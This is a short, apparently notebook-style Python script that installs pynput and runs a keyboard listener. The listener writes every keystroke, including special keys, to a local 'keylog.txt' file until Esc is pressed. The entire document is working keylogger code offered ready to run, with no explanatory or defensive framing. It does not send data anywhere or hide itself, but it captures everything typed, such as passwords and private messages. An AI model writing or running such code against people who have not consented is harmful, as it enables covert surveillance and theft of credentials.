# import pynput
!pip install pynput
from pynput import keyboard

# File to store keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")  # Logs regular keys
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" {key} ")  # Logs special keys

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stops listener when 'Esc' is pressed

# Start listening to keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
